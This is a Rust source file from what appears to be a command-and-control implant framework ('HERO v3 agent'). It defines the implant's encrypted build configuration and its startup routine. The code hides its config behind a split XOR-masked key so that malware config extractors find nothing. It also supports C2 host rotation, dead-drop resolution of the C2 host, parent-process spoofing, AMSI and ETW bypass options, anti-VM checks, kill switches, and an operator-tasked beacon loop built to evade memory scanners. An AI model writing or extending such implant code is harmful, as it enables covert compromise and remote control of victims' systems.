//! config.rs — HERO v3 agent build config
//!
//! v3 ARCHITECTURE (OPSEC: bake-minimization):
//!   The builder does NOT emit plaintext config literals anymore. Instead it
//!   marshals the full build config to JSON, encrypts it with a per-build
//!   random 32-byte key (SHA256 keystream) and replaces the constants between
//!   the BAKED BLOB markers below. `strings` / DC3-MWCP style config
//!   extractors find NOTHING — the key itself is stored split in 4 pieces,
//!   each XOR-masked with a per-build random mask.
//!
//!   Building via build.sh (no builder) leaves the blob empty →
//!   default_config() → empty PSK → fail-closed FATAL (unchanged v2 behavior:
//!   PSK only exists via the GUI builder).
//!
//! DO NOT hand-edit the blob block; it is regenerated on every build.

use crate::core_agent::{beacons::https_beacon as beacon, evasion};
use sha2::{Digest, Sha256};
use std::env;
use std::sync::Arc;

#[derive(Clone)]
pub struct AgentConfig {
    pub c2_host:           &'static str,
    pub c2_port:           u16,
    pub c2_protocol:       &'static str,
    pub c2_endpoint:       &'static str,
    pub user_agent:        &'static str,
    pub encryption_key:    &'static str,
    pub ca_cert_pem:       &'static str,
    pub agent_cert_pem:    &'static str,
    pub agent_key_pem:     &'static str,
    pub sleep_ms:          u32,
    pub jitter_ms:         u32,
    pub max_errors:        u32,
    pub kill_hostname:     &'static str,
    pub kill_username:     &'static str,
    pub kill_date:         &'static str,

    // ── OPSEC: Fallback domain (legacy single-host failover) ───
    // Kept for v2 compat; the v3 rotation list below supersedes it.
    pub fallback_host:     &'static str,
    pub fallback_port:     u16,

    // ── v3: multi-host rotation ────────────────────────────────
    // Rotation targets tried when the current host dies after max_retries.
    // Empty entries are skipped. All hosts are dialed with c2_port.
    // rotation_strategy: "failover" (try each once per outage, exit when
    // exhausted) | "round_robin" (keep cycling) | "random" (random hops).
    pub c2_hosts:          [&'static str; 4],
    pub rotation_strategy: &'static str,

    // ── v3: GET-poll mode ──────────────────────────────────────
    // poll_mode "get" → heartbeats are GET <get_endpoint>?v=<session-prefix>
    // (cache-buster cover); results still POST to c2_endpoint.
    // "post" (default) → v2 behavior. Runtime-swappable via profile task.
    pub poll_mode:         &'static str,
    pub get_endpoint:      &'static str,

    // ── v3: dead-drop resolver bootstrap (MITRE T1102.001) ─────
    // bootstrap_mode "deaddrop" → before the first check-in the agent
    // fetches bootstrap_url over public TLS and extracts a base64 host
    // string between bootstrap_begin..bootstrap_end. "direct" → no-op.
    pub bootstrap_mode:    &'static str,
    pub bootstrap_url:     &'static str,
    pub bootstrap_begin:   &'static str,
    pub bootstrap_end:     &'static str,

    // ── v3: post-ex process profile (profile [postex]) ─────────
    // spawnto: full path of the shell binary used by `shell` (e.g. a
    //          renamed cmd.exe). Empty = COMSPEC.
    // ppid:    image name whose PID becomes the spoofed parent of every
    //          post-ex spawn ("" = off). blockdlls: block non-Microsoft
    //          DLLs in spawned children.
    pub postex_spawnto:    &'static str,
    pub postex_ppid:       &'static str,
    pub postex_blockdlls:  bool,

    // ── OPSEC: Initial execution delay ────────────────────────
    pub initial_delay_ms:  u32,
    pub initial_delay_max_ms: u32,

    // ── OPSEC: Retry + Backoff ─────────────────────────────────
    pub max_retries:       u32,
    pub backoff_base_ms:   u32,
    pub backoff_max_ms:    u32,
    pub backoff_strategy:  &'static str,

    // ── OPSEC: Jitter distribution ────────────────────────────
    pub jitter_distribution: &'static str,

    // ── OPSEC: Working hours ───────────────────────────────────
    pub working_hours:     &'static str,

    // ── Evasion config (build-time selected, from profile [evasion]) ──
    pub direct_sys:        bool,          // true = sm_init() called in chain phase 9
    pub amsi_technique:    &'static str,
    pub etw_technique:     &'static str,
    pub sleep_technique:   &'static str,
    pub anti_vm_mask:      &'static str,

    // ── Fallback protocol order (reserved) ─────────────────────
    pub fallback_protocols: [&'static str; 4],

    // ── Malleable profile (encrypted inside the blob) ──────────
    pub profile_json:      &'static str,
}

/// Owned twin of AgentConfig — the shape of the decrypted JSON blob.
/// Field names MUST match the Go-side blob keys exactly (snake_case).
#[derive(serde::Deserialize)]
pub struct OwnedConfig {
    #[serde(default)] pub c2_host:           String,
    #[serde(default)] pub c2_port:           u16,
    #[serde(default)] pub c2_protocol:       String,
    #[serde(default)] pub c2_endpoint:       String,
    #[serde(default)] pub user_agent:        String,
    #[serde(default)] pub encryption_key:    String,
    #[serde(default)] pub ca_cert_pem:       String,
    #[serde(default)] pub agent_cert_pem:    String,
    #[serde(default)] pub agent_key_pem:     String,
    #[serde(default)] pub sleep_ms:          u32,
    #[serde(default)] pub jitter_ms:         u32,
    #[serde(default)] pub max_errors:        u32,
    #[serde(default)] pub kill_hostname:     String,
    #[serde(default)] pub kill_username:     String,
    #[serde(default)] pub kill_date:         String,
    #[serde(default)] pub fallback_host:     String,
    #[serde(default)] pub fallback_port:     u16,
    #[serde(default)] pub c2_hosts:          Vec<String>,
    #[serde(default)] pub rotation_strategy: String,
    #[serde(default)] pub poll_mode:         String,
    #[serde(default)] pub get_endpoint:      String,
    #[serde(default)] pub bootstrap_mode:    String,
    #[serde(default)] pub bootstrap_url:     String,
    #[serde(default)] pub bootstrap_begin:   String,
    #[serde(default)] pub bootstrap_end:     String,
    #[serde(default)] pub postex_spawnto:    String,
    #[serde(default)] pub postex_ppid:       String,
    #[serde(default)] pub postex_blockdlls:  bool,
    #[serde(default)] pub initial_delay_ms:  u32,
    #[serde(default)] pub initial_delay_max_ms: u32,
    #[serde(default)] pub max_retries:       u32,
    #[serde(default)] pub backoff_base_ms:   u32,
    #[serde(default)] pub backoff_max_ms:    u32,
    #[serde(default)] pub backoff_strategy:  String,
    #[serde(default)] pub jitter_distribution: String,
    #[serde(default)] pub working_hours:     String,
    #[serde(default)] pub amsi_technique:    String,
    #[serde(default)] pub etw_technique:     String,
    #[serde(default)] pub sleep_technique:   String,
    #[serde(default)] pub anti_vm_mask:      String,
    #[serde(default)] pub fallback_protocols: Vec<String>,
    #[serde(default)] pub profile_json:      String,
    #[serde(default)] pub direct_sys:        bool,   // HERO GATE syscall engine
}

fn leak(s: String) -> &'static str {
    if s.is_empty() { "" } else { Box::leak(s.into_boxed_str()) }
}

fn norm_evasion(v: String, def: &'static str) -> &'static str {
    let v = v.trim().to_lowercase();
    if v.is_empty() { def } else { leak(v) }
}

impl AgentConfig {
    /// Dev/default config — used when no blob is baked (build.sh direct) or
    /// when decoding fails. Empty PSK keeps the fail-closed contract.
    pub const fn default_config() -> Self {
        AgentConfig {
            c2_host:           "127.0.0.1",
            c2_port:           443,
            c2_protocol:       "https",
            c2_endpoint:       "/api/v1/c2-endpoint",
            // v3: the real UA always arrives inside the encrypted blob —
            // a compiled-in UA string would be a cross-build fingerprint.
            user_agent:        "",
            encryption_key:    "",
            ca_cert_pem:       "",
            agent_cert_pem:    "",
            agent_key_pem:     "",
            sleep_ms:          300_000,
            jitter_ms:         120_000,
            max_errors:        100,
            kill_hostname:     "",
            kill_username:     "",
            kill_date:         "",
            fallback_host:     "",
            fallback_port:     443,
            c2_hosts:          ["", "", "", ""],
            rotation_strategy: "failover",
            poll_mode:         "post",
            get_endpoint:      "",
            bootstrap_mode:    "direct",
            bootstrap_url:     "",
            bootstrap_begin:   "",
            bootstrap_end:     "",
            postex_spawnto:    "",
            postex_ppid:       "",
            postex_blockdlls:  false,
            initial_delay_ms:     5_000,
            initial_delay_max_ms: 10_000,
            max_retries:       1_000,
            backoff_base_ms:   60_000,
            backoff_max_ms:    14_400_000,
            backoff_strategy:  "exponential",
            jitter_distribution: "gaussian",
            working_hours:     "",
            direct_sys:        false,
            amsi_technique:    "hwbp",
            etw_technique:     "hwbp",
            sleep_technique:   "none",
            anti_vm_mask:      "none",
            fallback_protocols: ["none", "none", "none", "none"],
            profile_json:      "",
        }
    }

    /// Materialize a leaked AgentConfig from the decrypted blob.
    fn from_owned(o: OwnedConfig) -> Self {
        // Evasion normalization mirrors the old builder-side remap.
        let mut sleep_tech = o.sleep_technique.trim().to_lowercase();
        match sleep_tech.as_str() {
            "rc4" | "xor" | "wipe" => sleep_tech = "shadow7".into(),
            "none" | "shadow7" => {}
            _ => sleep_tech = "none".into(),
        }
        let mut hosts: [&'static str; 4] = ["", "", "", ""];
        for (i, h) in o.c2_hosts.iter().take(4).enumerate() {
            hosts[i] = leak(h.trim().to_string());
        }
        let mut protos: [&'static str; 4] = ["none", "none", "none", "none"];
        for (i, p) in o.fallback_protocols.iter().take(4).enumerate() {
            if p.is_empty() || p == "None" { continue; }
            protos[i] = leak(p.to_string());
        }
        AgentConfig {
            c2_host:              leak(o.c2_host),
            c2_port:              o.c2_port,
            c2_protocol:          if o.c2_protocol.is_empty() { "https" } else { leak(o.c2_protocol) },
            c2_endpoint:          leak(o.c2_endpoint),
            user_agent:           leak(o.user_agent),
            encryption_key:       leak(o.encryption_key),
            ca_cert_pem:          leak(o.ca_cert_pem),
            agent_cert_pem:       leak(o.agent_cert_pem),
            agent_key_pem:        leak(o.agent_key_pem),
            sleep_ms:             o.sleep_ms,
            jitter_ms:            o.jitter_ms,
            max_errors:           o.max_errors,
            kill_hostname:        leak(o.kill_hostname),
            kill_username:        leak(o.kill_username),
            kill_date:            leak(o.kill_date),
            fallback_host:        leak(o.fallback_host),
            fallback_port:        if o.fallback_port == 0 { 443 } else { o.fallback_port },
            c2_hosts:             hosts,
            rotation_strategy:    if o.rotation_strategy.is_empty() { "failover" } else { leak(o.rotation_strategy) },
            poll_mode:            if o.poll_mode.is_empty() { "post" } else { leak(o.poll_mode) },
            get_endpoint:         leak(o.get_endpoint),
            bootstrap_mode:       if o.bootstrap_mode.is_empty() { "direct" } else { leak(o.bootstrap_mode) },
            bootstrap_url:        leak(o.bootstrap_url),
            bootstrap_begin:      leak(o.bootstrap_begin),
            bootstrap_end:        leak(o.bootstrap_end),
            postex_spawnto:       leak(o.postex_spawnto),
            postex_ppid:          leak(o.postex_ppid),
            postex_blockdlls:     o.postex_blockdlls,
            initial_delay_ms:     o.initial_delay_ms,
            initial_delay_max_ms: o.initial_delay_max_ms,
            max_retries:          o.max_retries,
            backoff_base_ms:      if o.backoff_base_ms == 0 { 60_000 } else { o.backoff_base_ms },
            backoff_max_ms:       if o.backoff_max_ms == 0 { 14_400_000 } else { o.backoff_max_ms },
            backoff_strategy:     if o.backoff_strategy.is_empty() { "exponential" } else { leak(o.backoff_strategy) },
            jitter_distribution:  if o.jitter_distribution.is_empty() { "gaussian" } else { leak(o.jitter_distribution) },
            working_hours:        leak(o.working_hours),
            direct_sys:           o.direct_sys,
            amsi_technique:       norm_evasion(o.amsi_technique, "hwbp"),
            etw_technique:        norm_evasion(o.etw_technique, "hwbp"),
            sleep_technique:      leak(sleep_tech),
            anti_vm_mask:         norm_evasion(o.anti_vm_mask, "none"),
            fallback_protocols:   protos,
            profile_json:         leak(o.profile_json),
        }
    }
}

// ── BAKED BLOB ──────────────────────────────────────────────────────────────
// The builder replaces the constants between BEGIN/END markers verbatim.
// Each build gets a fresh random key + fresh random masks → every payload is
// byte-unique (anti-fingerprinting) and carries zero plaintext config.
// BEGIN_BAKED_BLOB
pub static BLOB: [u8; 0] = [];
pub static KEY_P: [[u8; 8]; 4] = [[0u8; 8]; 4];
pub static KEY_M: [[u8; 8]; 4] = [[0u8; 8]; 4];
// END_BAKED_BLOB

/// Reassemble the per-build key from its XOR-masked quarters.
fn reconstruct_key() -> [u8; 32] {
    let mut key = [0u8; 32];
    for i in 0..4 {
        for j in 0..8 {
            key[i * 8 + j] = KEY_P[i][j] ^ KEY_M[i][j];
        }
    }
    key
}

/// SHA256-keystream: block n = SHA256(key || n as u32 LE). Must stay in lockstep
/// with the Go builder (build_handler.go keystreamGo).
fn keystream(key: &[u8; 32], len: usize) -> Vec<u8> {
    let mut out = Vec::with_capacity(len + 32);
    let mut ctr: u32 = 0;
    while out.len() < len {
        let mut block = Vec::with_capacity(36);
        block.extend_from_slice(key);
        block.extend_from_slice(&ctr.to_le_bytes());
        out.extend_from_slice(&Sha256::digest(&block));
        ctr = ctr.wrapping_add(1);
    }
    out.truncate(len);
    out
}

/// Decrypt + parse the baked blob. None when no blob / corrupt / empty PSK.
pub fn decode_baked() -> Option<OwnedConfig> {
    if BLOB.is_empty() {
        return None;
    }
    let key = reconstruct_key();
    let ks = keystream(&key, BLOB.len());
    let plain: Vec<u8> = BLOB.iter().zip(ks.iter()).map(|(a, b)| a ^ b).collect();
    match serde_json::from_slice::<OwnedConfig>(&plain) {
        Ok(o) if !o.encryption_key.is_empty() => Some(o),
        _ => None,
    }
}

// Kill switch checks — exit if environment doesn't match
fn kill_switch(cfg: &AgentConfig) -> bool {
    if !cfg.kill_hostname.is_empty() {
        let hostname = env::var("COMPUTERNAME").unwrap_or_default().to_lowercase();
        if hostname != cfg.kill_hostname.to_lowercase() {
            return true;
        }
    }
    if !cfg.kill_username.is_empty() {
        let username = env::var("USERNAME").unwrap_or_default().to_lowercase();
        if username != cfg.kill_username.to_lowercase() {
            return true;
        }
    }
    if !cfg.kill_date.is_empty() {
        if let Some(parts) = parse_date(cfg.kill_date) {
            if current_date() >= parts {
                return true;
            }
        }
    }
    false
}

fn parse_date(s: &str) -> Option<(u32, u32, u32)> {
    let p: Vec<&str> = s.split('-').collect();
    if p.len() != 3 { return None; }
    Some((p[0].parse().ok()?, p[1].parse().ok()?, p[2].parse().ok()?))
}

fn current_date() -> (u32, u32, u32) {
    let date_str = env::var("DATE").unwrap_or_default();
    if let Some(d) = parse_date(&date_str) {
        return d;
    }
    #[cfg(target_os = "windows")]{
        use winapi::um::minwinbase::SYSTEMTIME;
        use winapi::um::sysinfoapi::GetSystemTime;
        use std::mem::MaybeUninit;
        unsafe {
            let mut st = MaybeUninit::<SYSTEMTIME>::uninit();
            GetSystemTime(st.as_mut_ptr());
            let st = st.assume_init();
            (st.wYear as u32, st.wMonth as u32, st.wDay as u32)
        }
    }
    #[cfg(not(target_os = "windows"))]
    (2026, 1, 1)
}

// Main entry — anti-analysis, evasion, then beacon loop
//
// CRITICAL: after init the agent stays SILENT — no autonomous actions, it
// only executes what the C2 operator tasks. Any autonomous operation would
// expose the beacon to memory scanners (Moneta, Volatility, Velociraptor).
pub fn run() {
    use super::debug_log;
    debug_log("=== HERO AGENT START (v3) ===");
    debug_log(&format!("PID: {}, Arch: {}, OS: {}",
        std::process::id(), std::env::consts::ARCH, std::env::consts::OS));

    // ── STEP 0: decode the baked config blob (or fall back to defaults) ──
    let mut owned = match decode_baked() {
        Some(o) => {
            debug_log("[CONFIG] Baked blob decoded OK (encrypted config, zero plaintext at rest)");
            o
        }
        None => {
            debug_log("[CONFIG] No baked blob — using default config (build.sh direct builds are fail-closed by design)");
            OwnedConfig::empty()
        }
    };

    // ── v3: dead-drop resolver bootstrap (MITRE T1102.001) ──────────────
    // The binary carries NO C2 host — it is fetched from a public dead drop
    // before the first check-in. Failure = fail-closed exit (no fallback to
    // any baked host, because there is none).
    if owned.bootstrap_mode == "deaddrop" && !owned.bootstrap_url.is_empty() {
        debug_log("[CONFIG] Bootstrap mode = deaddrop — resolving C2 via dead drop...");
        match crate::core_agent::commu::comms::resolve_deaddrop(
            &owned.bootstrap_url, &owned.bootstrap_begin, &owned.bootstrap_end,
            &owned.ca_cert_pem)
        {
            Some(host) => {
                debug_log(&format!("[CONFIG] Dead drop resolved C2 host (host hidden in logs)"));
                owned.c2_host = host;
            }
            None => {
                debug_log("FATAL: dead drop resolver failed — no C2 host available. Exiting silently.");
                debug_log("=== HERO AGENT EXIT (deaddrop resolve failed) ===");
                return;
            }
        }
    }

    // BUGFIX (Bug #7 — Box::leak Memory Leak): the original code did
    //   let cfg: &'static AgentConfig = Box::leak(Box::new(AgentConfig::from_owned(owned)));
    // which leaks the AgentConfig ONCE at startup — that single leak is
    // tolerable (the agent lives forever, so the config lives forever).
    //
    // The REAL leak is in comms.rs::set_fallback() which leaks ANOTHER
    // AgentConfig on every host rotation. 10 rotations = 10 leaks, each
    // ~2KB plus all the &'static str fields. On a long-running op with
    // aggressive rotation that adds up to real memory.
    //
    // FIX: switch the entire chain to Arc<AgentConfig>. The startup leak
    // becomes Arc::new (no leak), and set_fallback() becomes Arc::new(clone)
    // (the old Arc drops when refcount = 0, no leak).
    //
    // The AgentConfig fields are still &'static str (from the leak() helper
    // below) — those strings are baked in for the agent's lifetime and
    // don't need to be freed.
    let cfg: Arc<AgentConfig> = Arc::new(AgentConfig::from_owned(owned));

    debug_log(&format!("CONFIG: c2={}:{}{} proto={} ua_len={}",
        cfg.c2_host, cfg.c2_port, cfg.c2_endpoint, cfg.c2_protocol, cfg.user_agent.len()));
    debug_log(&format!("CONFIG: encryption_key={} chars ({} bytes hex)",
        cfg.encryption_key.len(), cfg.encryption_key.len() / 2));
    debug_log(&format!("CONFIG: ca_cert_pem={} bytes, hosts_rot={} strategy={} poll={}",
        cfg.ca_cert_pem.len(),
        cfg.c2_hosts.iter().filter(|h| !h.is_empty()).count(),
        cfg.rotation_strategy, cfg.poll_mode));
    debug_log(&format!("CONFIG: sleep_ms={} jitter_ms={} max_errors={}",
        cfg.sleep_ms, cfg.jitter_ms, cfg.max_errors));
    debug_log(&format!("CONFIG: evasion: amsi={} etw={} sleep={} antivm={}",
        cfg.amsi_technique, cfg.etw_technique, cfg.sleep_technique, cfg.anti_vm_mask));

    // Check encryption_key BEFORE anything else
    if cfg.encryption_key.is_empty() {
        debug_log("FATAL: encryption_key is EMPTY — agent cannot create session.");
        debug_log("FIX: Build agent via GUI Builder (which bakes the encrypted config) — build.sh direct builds carry no PSK.");
        debug_log("=== HERO AGENT EXIT (no encryption key) ===");
        return;
    }
    if cfg.encryption_key.len() != 64 {
        debug_log(&format!("FATAL: encryption_key is {} chars, expected 64 hex chars (32 bytes)", cfg.encryption_key.len()));
        debug_log("=== HERO AGENT EXIT (invalid key length) ===");
        return;
    }

    // Kill switch — exit silently if environment doesn't match
    debug_log("STEP 1: Kill switch check...");
    if kill_switch(&cfg) {
        debug_log("FATAL: Kill switch triggered — agent exiting silently.");
        debug_log("=== HERO AGENT EXIT (kill switch) ===");
        return;
    }
    debug_log("STEP 1: Kill switch check PASSED");

    // Run the full pre-beacon chain (8 phases: anti-debug, anti-vm,
    // exec_gap, env_maturity, net_probe, AMSI, ETW, sleep_mask_key).
    // Any phase failure → silent exit(0). Network is NEVER touched until
    // all local gates pass.
    debug_log("STEP 2: Running pre-beacon chain (8 phases)...");
    evasion::chain::execute(&cfg);  // Arc<AgentConfig> derefs to &AgentConfig
    debug_log("STEP 2: Chain complete — all phases passed");

    // Apply the baked malleable profile (encrypted inside the blob) BEFORE
    // any network activity — the very first check-in already speaks the
    // profile dialect. Runtime swaps happen via the 'profile' operator command.
    super::profile::init_from_baked(cfg.profile_json);

    // Enter beacon loop — waits for tasks from C2
    debug_log("STEP 3: Entering beacon loop (silent until tasked)...");
    debug_log("=== BEACON LOOP STARTING ===");
    beacon::start(cfg);  // moves the Arc into the beacon loop

    // beacon::start() only returns on fatal error or max_errors
    debug_log("=== HERO AGENT EXIT (beacon loop ended) ===");
}

impl OwnedConfig {
    /// All-empty config — the default path for blob-less builds.
    pub fn empty() -> Self {
        serde_json::from_str("{}").unwrap_or_else(|_| OwnedConfig {
            c2_port: 443, fallback_port: 443, postex_blockdlls: false,
            c2_host: String::new(), c2_protocol: String::new(), c2_endpoint: String::new(),
            user_agent: String::new(), encryption_key: String::new(), ca_cert_pem: String::new(),
            agent_cert_pem: String::new(), agent_key_pem: String::new(),
            sleep_ms: 0, jitter_ms: 0, max_errors: 0,
            kill_hostname: String::new(), kill_username: String::new(), kill_date: String::new(),
            fallback_host: String::new(),
            c2_hosts: Vec::new(), rotation_strategy: String::new(),
            poll_mode: String::new(), get_endpoint: String::new(),
            bootstrap_mode: String::new(), bootstrap_url: String::new(),
            bootstrap_begin: String::new(), bootstrap_end: String::new(),
            postex_spawnto: String::new(), postex_ppid: String::new(),
            initial_delay_ms: 0, initial_delay_max_ms: 0,
            max_retries: 0, backoff_base_ms: 0, backoff_max_ms: 0,
            backoff_strategy: String::new(), jitter_distribution: String::new(),
            working_hours: String::new(),
            direct_sys: false,
            amsi_technique: String::new(), etw_technique: String::new(),
            sleep_technique: String::new(), anti_vm_mask: String::new(),
            fallback_protocols: Vec::new(), profile_json: String::new(),
        })
    }
}
